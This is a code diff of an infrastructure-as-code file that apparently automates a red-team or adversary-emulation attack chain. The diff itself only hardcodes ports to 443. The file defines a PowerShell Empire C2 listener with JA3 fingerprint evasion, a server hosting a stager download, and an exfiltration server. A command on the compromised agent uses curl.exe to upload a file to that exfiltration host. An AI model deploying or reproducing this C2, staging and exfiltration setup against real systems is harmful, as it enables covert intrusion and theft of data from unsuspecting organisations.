@@ -21,36 +21,6 @@ variable "domain_name" {
     description = "The domain name to be associated with the external facing listeners."
 }
 
-variable "c2_port" {
-    description = "Port number to use for the C2 listener."
-    default = "443"
-}
-
-variable "http_port" {
-    description = "Port number to use for the downloads server's HTTP listener."
-    default = "443"
-}
-
-variable "exfil_port" {
-    description = "Port number to use for the exfil server's HTTP."
-    default = "443"
-}
-
-variable "c2_listener_type" {
-    description = "The type of listener to use for the C2 listener."
-    default = "HTTPS"
-}
-
-variable "http_listener_type" {
-    description = "The type of listener to use for the HTTP listener."
-    default = "HTTPS"
-}
-
-variable "exfil_listener_type" {
-    description = "The type of listener to use for the exfil listener."
-    default = "HTTPS"
-}
-
 variable "exfil_file" {
     description = "File name to use for the exfil file."
     default     = "exfil_file.txt"
@@ -107,34 +77,33 @@ resource "random_string" "random_32" {
 resource "portgroup" "c2_portgroup" {
     portgroup_name = "c2_portgroup_${local.function.date_stamp}"
     ip_ranges      = variable.public_cidr
-    port           = variable.c2_port
+    port           = "443"
     ip_protocol    = "tcp"
 }
 
 resource "portgroup" "http_portgroup" {
     portgroup_name = "http_portgroup_${local.function.date_stamp}"
     ip_ranges      = variable.public_cidr
-    port           = variable.http_port
+    port           = "443"
     ip_protocol    = "tcp"
 }
 
 resource "portgroup" "exfil_portgroup" {
     portgroup_name = "exfil_portgroup_${local.function.date_stamp}"
     ip_ranges      = variable.public_cidr
-    port           = variable.exfil_port
+    port           = "443"
     ip_protocol    = "tcp"
 }
 
 resource "task" "c2_task" {
     task_type  = "powershell_empire"
     task_name  = "c2_task_${local.function.date_stamp}"
-    portgroups = [resource.portgroup.c2_portgroup.portgroup_name]
 
     listener {
         http_malleable {
             Profile     = "trevor.profile"
-            Host        = "${variable.c2_listener_type}://c2-${resource.random_string.random_6.result}.${variable.domain_name}:${variable.c2_port}"
-            Port        = variable.c2_port
+            Host        = "https://c2-${resource.random_string.random_6.result}.${variable.domain_name}:443"
+            Port        = "443"
             StagingKey  = resource.random_string.random_32.result
             JA3_Evasion = "True"
         }
@@ -159,8 +128,8 @@ resource "task" "c2_task" {
 
 resource "listener" "c2_listener" {
     listener_name = "c2_listener_${local.function.date_stamp}"
-    listener_type = variable.c2_listener_type
-    listener_port = variable.c2_port
+    listener_type = "HTTPS"
+    listener_port = "443"
     task_name     = resource.task.c2_task.task_name
     portgroups    = [resource.portgroup.c2_portgroup.portgroup_name]
     host_name     = "c2-${resource.random_string.random_6.result}"
@@ -170,11 +139,10 @@ resource "listener" "c2_listener" {
 resource "task" "http_task" {
     task_type  = "http_server"
     task_name  = "http_task_${local.function.date_stamp}"
-    portgroups = [resource.portgroup.http_portgroup.portgroup_name]
 
     listener {
-        http {
-            Port = variable.http_port
+        https {
+            Port = "443"
         }
         tls {
             cert_type = "self-signed"
@@ -190,8 +158,8 @@ resource "task" "http_task" {
 
 resource "listener" "http_listener" {
     listener_name = "http_listener_${local.function.date_stamp}"
-    listener_type = variable.http_listener_type
-    listener_port = variable.http_port
+    listener_type = "HTTPS"
+    listener_port = "443"
     task_name     = resource.task.http_task.task_name
     portgroups    = [resource.portgroup.http_portgroup.portgroup_name]
     host_name     = "downloads-${resource.random_string.random_6.result}"
@@ -201,11 +169,10 @@ resource "listener" "http_listener" {
 resource "task" "exfil_task" {
     task_type  = "exfil_server"
     task_name  = "exfil_task_${local.function.date_stamp}"
-    portgroups = resource.portgroup.exfil_portgroup.portgroup_name
 
     listener {
-        http {
-            Port = variable.exfil_port
+        https {
+            Port = "443"
         }
         tls {
             cert_type = "self-signed"
@@ -221,8 +188,8 @@ resource "task" "exfil_task" {
 
 resource "listener" "exfil_listener" {
     listener_name = "exfil_listener_${local.function.date_stamp}"
-    listener_type = variable.exfil_listener_type
-    listener_port = variable.exfil_port
+    listener_type = "HTTPS"
+    listener_port = "443"
     task_name     = resource.task.exfil_task.task_name
     portgroups    = [resource.portgroup.exfil_portgroup.portgroup_name]
     host_name     = "uploads-${resource.random_string.random_6.result}"
@@ -241,7 +208,7 @@ action "download_from_workspace" "stager_download" {
 
 action "task_download_file" "download_stager" {
     task_name    = data.tasks.initial_access_task.task_name
-    url          = "${resource.listener.http_listener.listener_type}://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}/${action.download_from_workspace.stager_download.file_name}"
+    url          = "https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}/${action.download_from_workspace.stager_download.file_name}"
     file_name    = action.download_from_workspace.stager_download.file_name
 }
 
@@ -385,7 +352,7 @@ action "agent_execute_shell_command" "create_exfil_file" {
 action "agent_execute_shell_command" "upload_exfil_file" {
     task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
-    command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} ${resource.listener.exfil_listener.listener_type}://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:${variable.exfil_port}/p"
+    command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} https://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:443/p"
     wait_for_results  = true
 }
 
